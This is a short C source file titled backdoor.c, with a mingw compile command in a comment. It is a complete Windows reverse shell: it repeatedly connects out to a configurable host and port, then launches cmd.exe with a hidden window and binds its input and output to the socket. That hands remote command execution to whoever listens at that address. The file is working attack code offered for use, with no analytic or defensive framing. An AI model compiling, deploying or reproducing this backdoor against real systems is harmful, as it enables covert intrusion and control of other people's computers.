// backdoor.c
// i686-w64-mingw32-gcc backdoor.c -DHOST=\"192.168.1.2\" -o backdoor.exe -lws2_32

#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

#ifndef HOST
    #define HOST "127.0.0.1"
#endif
#ifndef PORT
    #define PORT 1234
#endif

SOCKET sock;

void connect_to_server(char *host, unsigned short port);
void rev_shell();

int main()
{
    connect_to_server((char*) HOST, PORT);
    rev_shell();

    return 0;
}

// Connect to server
void connect_to_server(char *host, unsigned short port)
{
    struct sockaddr_in addr;
    WSADATA wsaData;
    
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        printf("WSAStartup failed: %d\n", WSAGetLastError());
        exit(1);
    }

    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET)
    {
        printf("WSASocket failed: %d\n", WSAGetLastError());
        WSACleanup();
        exit(1);
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(host);

    while (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR)
    {
        Sleep(3000);
        printf("Connecting...\n");
    }
}

// Reverse shell
void rev_shell()
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES);
    si.wShowWindow = SW_HIDE;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
    {
        printf("CreateProcess failed: %d\n", GetLastError());
        exit(1);
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
